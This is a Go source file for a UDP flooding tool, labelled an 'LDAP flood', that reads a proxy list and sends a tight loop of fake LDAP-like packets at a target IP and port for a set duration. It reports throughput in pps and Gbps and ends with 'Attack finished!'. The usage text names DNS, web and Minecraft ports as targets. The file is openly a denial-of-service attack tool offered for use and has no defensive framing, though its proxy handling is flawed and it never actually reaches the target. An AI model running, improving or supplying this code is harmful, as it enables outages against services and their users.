package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	packetsSent uint64
	bytesSent   uint64
	stopFlag    uint32
	proxies     []string
)

func main() {
	if len(os.Args) < 4 {
		fmt.Printf("Usage: %s <ip> <port> <time>\n", os.Args[0])
		fmt.Println("Example: ./pps 1.2.3.4 53 60")
		fmt.Println("Common ports: 53 (DNS), 80 (HTTP), 443 (HTTPS), 19132 (Minecraft)")
		os.Exit(1)
	}

	// Load proxies from meow.txt
	if err := loadProxies("meow.txt"); err != nil {
		fmt.Printf("[-] Failed to load proxies: %v\n", err)
		os.Exit(1)
	}

	if len(proxies) == 0 {
		fmt.Println("[-] No proxies found in meow.txt")
		os.Exit(1)
	}

	fmt.Printf("[+] Loaded %d proxies from meow.txt\n", len(proxies))

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration := parseDuration(os.Args[3])

	// Set max CPU usage and affinity
	runtime.GOMAXPROCS(1) // Single core for maximum packet processing

	target := fmt.Sprintf("%s:%s", targetIP, targetPort)
	fmt.Printf("[+] Starting UDP LDAP flood to %s for %v using proxies\n", target, duration)

	// Create multiple connections through proxies
	conns := createProxyConnections(target, 16)
	if len(conns) == 0 {
		fmt.Println("[-] Failed to create any proxy connections")
		os.Exit(1)
	}
	defer func() {
		for _, conn := range conns {
			conn.Close()
		}
	}()

	// Setup stats printing
	stopStats := make(chan bool)
	statsDone := make(chan bool)
	go printStats(stopStats, statsDone)

	// Handle interrupt signals
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)

	// Pre-generate all LDAP UDP packets
	packetBuffers := generateAllLDAPUDPPackets()

	// Start flood
	for i, conn := range conns {
		go optimizedFlood(conn, target, targetPort, packetBuffers, i, len(conns))
	}

	// Set timer
	timer := time.NewTimer(duration)

	// Wait for timer or interrupt
	select {
	case <-timer.C:
		fmt.Println("\n[+] Time's up! Stopping flood...")
	case <-sigCh:
		fmt.Println("\n[+] Interrupt received! Stopping flood...")
	}

	// Stop the flood
	atomic.StoreUint32(&stopFlag, 1)

	// Stop stats and wait for it to finish
	close(stopStats)
	<-statsDone

	// Print final stats
	printFinalStats()
}

func loadProxies(filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			// Handle space-separated format: "ip port"
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				// Combine IP and port into "ip:port" format
				proxy := fmt.Sprintf("%s:%s", parts[0], parts[1])
				proxies = append(proxies, proxy)
			}
		}
	}

	return scanner.Err()
}

func createProxyConnections(target string, count int) []*net.UDPConn {
	conns := make([]*net.UDPConn, 0, count)
	targetAddr, err := net.ResolveUDPAddr("udp", target)
	if err != nil {
		fmt.Printf("[-] Failed to resolve target: %v\n", err)
		return conns
	}

	for i := 0; i < count && i < len(proxies); i++ {
		proxy := proxies[i%len(proxies)]
		conn, err := createProxyConnection(proxy, targetAddr)
		if err != nil {
			fmt.Printf("[-] Failed to create proxy connection %d via %s: %v\n", i, proxy, err)
			continue
		}

		conns = append(conns, conn)
	}

	return conns
}

func createProxyConnection(proxy string, targetAddr *net.UDPAddr) (*net.UDPConn, error) {
	// Parse proxy address (format: ip:port)
	proxyParts := strings.Split(proxy, ":")
	if len(proxyParts) != 2 {
		return nil, fmt.Errorf("invalid proxy format: %s", proxy)
	}

	proxyIP := proxyParts[0]
	proxyPort, err := strconv.Atoi(proxyParts[1])
	if err != nil {
		return nil, fmt.Errorf("invalid proxy port: %s", proxyParts[1])
	}

	// Create UDP connection through proxy
	proxyAddr := &net.UDPAddr{
		IP:   net.ParseIP(proxyIP),
		Port: proxyPort,
	}

	conn, err := net.DialUDP("udp", nil, proxyAddr)
	if err != nil {
		return nil, err
	}

	// Set socket options for performance
	if err := setSocketOptions(conn); err != nil {
		conn.Close()
		return nil, err
	}

	fmt.Printf("[+] Created proxy connection via %s\n", proxy)
	return conn, nil
}

func setSocketOptions(conn *net.UDPConn) error {
	file, err := conn.File()
	if err != nil {
		return err
	}
	defer file.Close()

	fd := int(file.Fd())

	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 1024*1024*64); err != nil {
		return err
	}

	return nil
}

func generateAllLDAPUDPPackets() [][]byte {
	packets := make([][]byte, 0, 1000)

	// Generate various LDAP UDP packets
	for i := 0; i < 800; i++ {
		// Vary packet sizes between 64-512 bytes
		size := 64 + (i % 448)
		packet := createLDAPUDPPacket(i, size)
		packets = append(packets, packet)
	}

	return packets
}

func createLDAPUDPPacket(id int, size int) []byte {
	packet := make([]byte, size)
	
	// LDAP message header (simplified)
	// Message ID (4 bytes)
	binary.BigEndian.PutUint32(packet[0:4], uint32(id%65536))
	
	// LDAP message type: Search Request (0x63)
	packet[4] = 0x63
	
	// Message length (placeholder)
	packet[5] = byte(size - 6)
	
	// Fill the rest with LDAP-like data
	for i := 6; i < size; i++ {
		// Create pattern that looks like LDAP data
		packet[i] = byte((id + i) % 256)
		
		// Insert some LDAP-like patterns occasionally
		if i%20 == 0 && i+4 < size {
			// Insert common LDAP OIDs or strings
			patterns := [][]byte{
				[]byte("cn="),
				[]byte("dc="),
				[]byte("ou="),
				[]byte("objectClass"),
				[]byte("uid="),
				[]byte("mail="),
				[]byte("1.2.840.113549"), // Common OID
				[]byte("2.5.4."),        // X500 OID prefix
			}
			pattern := patterns[(id+i)%len(patterns)]
			if i+len(pattern) < size {
				copy(packet[i:], pattern)
				i += len(pattern) - 1
			}
		}
	}
	
	return packet
}

func optimizedFlood(conn *net.UDPConn, target, port string, packets [][]byte, workerID, totalWorkers int) {
	packetCount := len(packets)

	for atomic.LoadUint32(&stopFlag) == 0 {
		// Send packets in a tight loop
		for i := 0; i < 10000 && atomic.LoadUint32(&stopFlag) == 0; i++ {
			// Select packet based on worker ID for better distribution
			idx := (workerID + i) % packetCount
			packet := packets[idx]

			// Send the packet (ignore errors for speed)
			n, err := conn.Write(packet)
			if err == nil {
				atomic.AddUint64(&packetsSent, 1)
				atomic.AddUint64(&bytesSent, uint64(n))
			}
		}
	}
}

func printStats(stop, done chan bool) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	var lastPackets uint64
	var lastBytes uint64
	startTime := time.Now()

	for {
		select {
		case <-ticker.C:
			currentPackets := atomic.LoadUint64(&packetsSent)
			currentBytes := atomic.LoadUint64(&bytesSent)

			elapsed := time.Since(startTime).Seconds()
			pps := float64(currentPackets-lastPackets) / 2.0 // 2-second interval
			bps := float64(currentBytes-lastBytes) * 8 / 2.0 / 1e9

			totalPPS := float64(currentPackets) / elapsed
			totalBPS := float64(currentBytes) * 8 / elapsed / 1e9

			fmt.Printf("\r[+] Current: %.2fM pps, %.2f Gbps | Total: %.2fM pps, %.2f Gbps | Packets: %d | Proxies: %d",
				pps/1e6, bps, totalPPS/1e6, totalBPS, currentPackets, len(proxies))

			lastPackets = currentPackets
			lastBytes = currentBytes

		case <-stop:
			close(done)
			return
		}
	}
}

func printFinalStats() {
	totalPackets := atomic.LoadUint64(&packetsSent)
	totalBytes := atomic.LoadUint64(&bytesSent)
	totalGB := float64(totalBytes) / 1024 / 1024 / 1024
	avgPacketSize := float64(0)
	if totalPackets > 0 {
		avgPacketSize = float64(totalBytes) / float64(totalPackets)
	}

	fmt.Printf("\n\n[+] Attack finished!\n")
	fmt.Printf("[+] Total LDAP UDP packets sent: %d (%.2fM)\n", totalPackets, float64(totalPackets)/1e6)
	fmt.Printf("[+] Total data sent: %.2f GB\n", totalGB)
	fmt.Printf("[+] Average packet size: %.2f bytes\n", avgPacketSize)
	fmt.Printf("[+] Proxies used: %d\n", len(proxies))
}

func parseDuration(timeStr string) time.Duration {
	var durationValue int
	var unit time.Duration = time.Second

	// Parse the duration string
	fmt.Sscanf(timeStr, "%d", &durationValue)

	// Check for unit suffix
	if len(timeStr) > 0 {
		lastChar := timeStr[len(timeStr)-1]
		switch lastChar {
		case 's', 'S':
			// already in seconds
		case 'm', 'M':
			unit = time.Minute
		case 'h', 'H':
			unit = time.Hour
		}
	}

	return time.Duration(durationValue) * unit
}
